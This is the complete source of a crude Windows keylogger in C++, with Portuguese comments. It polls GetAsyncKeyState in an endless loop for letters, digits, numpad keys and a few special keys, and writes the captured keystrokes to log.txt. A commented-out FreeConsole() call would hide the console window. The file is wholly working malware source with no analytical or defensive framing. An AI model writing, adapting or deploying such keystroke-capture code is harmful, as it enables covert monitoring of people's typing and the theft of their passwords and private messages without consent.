#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main(){
   // FreeConsole();
    ofstream arquivo;
    string teclas;

    while(true){
      if(GetAsyncKeyState(0x41)){
           cout << "a";
           teclas+= "a";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x42)){
           cout << "b";
           teclas+= "b";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x43)){
           cout << "c";
           teclas+= "c";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x44)){
           cout<<"d";
           teclas+="d";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x45)){
           cout<<"e";
           teclas+="e";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x46)){
           cout<<"f";
           teclas+="f";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x47)){
           cout<<"g";
           teclas+="g";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x48)){
           cout<<"h";
           teclas+="h";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x49)){
           cout<<"i";
           teclas+="i";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x4a)){
           cout<<"j";
           teclas+="j";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x4b)){
           cout<<"k";
           teclas+="k";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x4c)){
           cout<<"l";
           teclas+="l";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x4d)){
           cout<<"m";
           teclas+="m";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x4e)){
           cout<<"n";
           teclas+="n";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x4f)){
           cout<<"o";
           teclas+="o";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x50)){
           cout<<"p";
           teclas+="p";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x51)){
           cout<<"q";
           teclas+="q";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x52)){
           cout<<"r";
           teclas+="r";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x53)){
           cout<<"s";
           teclas+="s";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x54)){
           cout<<"t";
           teclas+="t";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x55)){
           cout<<"u";
           teclas+="u";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x56)){
           cout<<"v";
           teclas+="v";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x57)){
           cout<<"w";
           teclas+="w";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x58)){
           cout<<"x";
           teclas+="x";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x59)){
           cout<<"y";
           teclas+="y";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x5A)){
           cout<<"z";
           teclas+="z";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_SPACE)){
           cout<<" ";
           teclas+=" ";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_DELETE)){
           cout<<"*DELETE*";
           teclas+="*DELETE*";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_SHIFT)){
           cout<<"*SHIFT*";
           teclas+="*SHIFT*";
           Sleep(100);
      };


//------------------INÍCIO CARACTERES ESPECIAIS--------------------
      if(GetAsyncKeyState(0x2E)){
           cout<<"*.PONTO*";
           teclas+="*.PONTO*";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x0D)){
           cout<<"/n";
           teclas+="*ENTER*";
           Sleep(100);
      };


//-----------------FIM CARACTERES ESPECIAIS------------------

//--------------INÍCIO NÚMEROS NUMBER PAD------------------------
      if(GetAsyncKeyState(VK_NUMPAD0)){
           cout<<"0";
           teclas+="0";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD1)){
           cout<<"1";
           teclas+="1";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD2)){
           cout<<"2";
           teclas+="2";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD3)){
           cout<<"3";
           teclas+="3";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD4)){
           cout<<"4";
           teclas+="4";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD5)){
           cout<<"5";
           teclas+="5";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD6)){
           cout<<"6";
           teclas+="6";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD7)){
           cout<<"7";
           teclas+="7";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD8)){
           cout<<"8";
           teclas+="8";
           Sleep(100);
      };
      if(GetAsyncKeyState(VK_NUMPAD9)){
           cout<<"9";
           teclas+="9";
           Sleep(100);
      };
//--------------------FIM NÚMEROS DO NUMBER PAD---------------

//--------------------INÍCIO NÚMEROS TECLADO-----------------------
      if(GetAsyncKeyState(0x30)){
           cout<<"0";
           teclas+="0";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x31)){
           cout<<"1";
           teclas+="1";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x32)){
           cout<<"2";
           teclas+="2";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x33)){
           cout<<"3";
           teclas+="3";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x34)){
           cout<<"4";
           teclas+="4";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x35)){
           cout<<"5";
           teclas+="5";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x36)){
           cout<<"6";
           teclas+="6";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x37)){
           cout<<"7";
           teclas+="7";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x38)){
           cout<<"8";
           teclas+="8";
           Sleep(100);
      };
      if(GetAsyncKeyState(0x39)){
           cout<<"9";
           teclas+="9";
           Sleep(100);
      };
//----------------FIM NÚMEROS DO TECLADO------------
  arquivo.open ("log.txt");
  arquivo << teclas;
  arquivo.close();
};
}
